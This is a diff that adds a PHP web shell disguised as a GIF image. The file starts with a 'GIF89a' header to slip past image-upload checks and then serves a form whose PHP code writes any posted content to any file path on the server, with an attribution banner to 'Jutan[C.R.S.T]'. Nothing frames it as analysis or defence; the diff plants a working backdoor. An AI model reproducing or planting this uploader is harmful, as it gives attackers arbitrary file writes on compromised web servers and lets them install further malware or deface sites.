@@ -1,0 +1,26 @@
+GIF89a$       ;<hTml>
+<style>
+body{font-family:Georgia;}
+#x{width:560px;height:250px;border=#000 1px solid}
+#p{font-family:Georgia;width:385px;border=#000 1px solid}
+#b{font-family:Georgia;background:#fff;width:60px;height:20px;border=#000 1px solid}
+</style>
+<?php
+if ($_POST)
+{
+   $fo=fopen($_POST["p"],"w");
+   if(fwrite($fo,$_POST["x"]))
+    echo "<font color=red>Success!</font>";
+   else
+    echo "<font color=red>UnSuccess?</font>";
+   fclose($_POST["p"]);
+}
+else
+echo "<font color=red>UpLoad Page By:Jutan[C.R.S.T]</font>";
+?>
+<form action="" method="post">
+Absolute Path:<input type="text" name="p" id="p" value='<?php echo $_SERVER["SCRIPT_FILENAME"]?>' />
+<input type="submit" id="b" value="UpLoad" /><br />
+<textarea name="x" id="x">
+</textarea>
+</form>
